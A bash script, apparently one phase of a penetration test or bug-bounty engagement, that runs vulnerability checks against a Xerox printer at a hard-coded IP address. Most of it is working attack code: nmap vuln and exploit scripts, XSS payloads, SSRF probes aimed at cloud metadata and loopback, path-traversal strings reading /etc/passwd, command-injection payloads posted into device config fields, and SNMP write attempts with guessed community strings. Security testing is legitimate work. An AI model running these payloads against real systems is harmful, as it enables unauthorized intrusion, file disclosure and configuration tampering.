#!/bin/bash
# Phase 7: Vulnerability Scanning & Exploit Checks
# NOTE: "Vulnerabilities easily detectable via automated scanners" are OOS
#       Focus on deeper checks that scanners miss

TARGET="13.13.1.112"
OUTDIR="../results/07_vulns"
mkdir -p "$OUTDIR"

echo "[*] Phase 7: Vulnerability Assessment - $TARGET"

###############################################################################
# 7a. SSL/TLS Analysis (beyond basic config which is OOS)
###############################################################################
echo "[+] SSL/TLS deep analysis..."

# Check for exploitable TLS issues (not just config best practices)
if command -v testssl &>/dev/null || command -v testssl.sh &>/dev/null; then
  TESTSSL=$(command -v testssl || command -v testssl.sh)
  "$TESTSSL" --severity HIGH --color 0 "$TARGET:443" > "$OUTDIR/testssl.txt" 2>/dev/null
fi

# Check for client cert bypass
echo "[+] Testing client certificate handling..."
openssl s_client -connect "$TARGET:443" < /dev/null 2>/dev/null \
  | grep -i "client certificate" | tee "$OUTDIR/client_cert.txt"

# Check for SSLv2/SSLv3 (exploitable, not just config)
for VER in ssl2 ssl3; do
  echo "" | timeout 5 openssl s_client -"$VER" -connect "$TARGET:443" 2>/dev/null
  [[ $? -eq 0 ]] && echo "[!] $VER SUPPORTED - Exploitable" | tee -a "$OUTDIR/ssl_vulns.txt"
done

###############################################################################
# 7b. Nmap vulnerability scripts
###############################################################################
echo "[+] Running Nmap vuln scripts..."

nmap -p 80,443,21,22,23,515,631,9100 \
  --script=vuln,exploit \
  --script-args=unsafe=0 \
  -oA "$OUTDIR/nmap_vuln" "$TARGET" 2>/dev/null

# Specific checks
nmap -p 443 --script=ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params \
  -oA "$OUTDIR/nmap_ssl_vulns" "$TARGET" 2>/dev/null

###############################################################################
# 7c. Web application vulnerability checks
###############################################################################
echo "[+] Web application vulnerability testing..."

# XSS in search/input fields
echo "[+] Testing for XSS in common parameters..."

XSS_PAYLOADS=(
  '<script>alert(1)</script>'
  '"><img src=x onerror=alert(1)>'
  "'-alert(1)-'"
  '{{7*7}}'
)

# Test XSS on common Xerox web UI parameters
PARAMS=("search" "query" "name" "value" "host" "email" "domain" "server"
        "path" "url" "dest" "redirect" "callback" "next" "ref")

for PARAM in "${PARAMS[@]}"; do
  for PAYLOAD in "${XSS_PAYLOADS[@]}"; do
    RESP=$(curl -sk --connect-timeout 3 \
      "https://$TARGET/?${PARAM}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")" \
      2>/dev/null)
    if echo "$RESP" | grep -qF "$PAYLOAD"; then
      echo "  [!] Potential reflected XSS: param=$PARAM" | tee -a "$OUTDIR/xss_findings.txt"
    fi
  done
done

# SSRF testing on Xerox connectors/scan destinations
echo "[+] Testing for SSRF in scan/connector configuration..."
SSRF_TARGETS=("http://169.254.169.254/latest/meta-data/"
              "http://127.0.0.1/"
              "http://[::1]/"
              "http://0.0.0.0/")

for SSRF in "${SSRF_TARGETS[@]}"; do
  # Try setting scan destination to internal addresses
  curl -sk --connect-timeout 3 -X POST \
    -d "server=${SSRF}" \
    "https://$TARGET/scan/" \
    -o "$OUTDIR/ssrf_test.html" 2>/dev/null
done

# Path traversal
echo "[+] Testing for path traversal..."
TRAVERSALS=(
  "....//....//....//....//etc/passwd"
  "..%252f..%252f..%252f..%252fetc/passwd"
  "..%c0%af..%c0%af..%c0%afetc/passwd"
  "....\/....\/....\/....\/etc/passwd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
)

for TRAV in "${TRAVERSALS[@]}"; do
  RESP=$(curl -sk --connect-timeout 3 "https://$TARGET/$TRAV" 2>/dev/null)
  if echo "$RESP" | grep -q "root:"; then
    echo "  [!] PATH TRAVERSAL FOUND: $TRAV" | tee -a "$OUTDIR/traversal_findings.txt"
  fi
done

###############################################################################
# 7d. Command injection in printer parameters
###############################################################################
echo "[+] Testing for command injection in device settings..."

# Common injection points in printer config: hostname, SNMP location, email settings
CI_PAYLOADS=(
  '$(id)'
  '`id`'
  ';id'
  '|id'
  '||id'
  '%0aid'
)

for FIELD in "hostname" "location" "contact" "domain" "smtpServer" "ldapServer"; do
  for CI in "${CI_PAYLOADS[@]}"; do
    curl -sk --connect-timeout 3 -X POST \
      -d "${FIELD}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${CI}'))")" \
      "https://$TARGET/set_config" \
      -o /dev/null 2>/dev/null
  done
done

###############################################################################
# 7e. SNMP write access (config modification)
###############################################################################
echo "[+] Testing SNMP write access..."

COMM="public"
[[ -f "../results/03_snmp/valid_communities.txt" ]] && COMM=$(head -1 "../results/03_snmp/valid_communities.txt")

# Test if we can write via SNMP (try to read-write sysContact as harmless test)
ORIG=$(snmpget -v2c -c "$COMM" -OvQ "$TARGET" 1.3.6.1.2.1.1.4.0 2>/dev/null)
echo "  Current sysContact: $ORIG"

# Try common write communities
for WCOMM in "private" "write" "admin" "xerox" "XEROX" "internal"; do
  snmpset -v2c -c "$WCOMM" "$TARGET" 1.3.6.1.2.1.1.4.0 s "recon_test" 2>/dev/null
  if [[ $? -eq 0 ]]; then
    echo "  [!] SNMP WRITE ACCESS with community '$WCOMM'" | tee -a "$OUTDIR/snmp_write.txt"
    # Restore original value
    snmpset -v2c -c "$WCOMM" "$TARGET" 1.3.6.1.2.1.1.4.0 s "$ORIG" 2>/dev/null
  fi
done

echo "[*] Vulnerability assessment complete. Review results in $OUTDIR/"
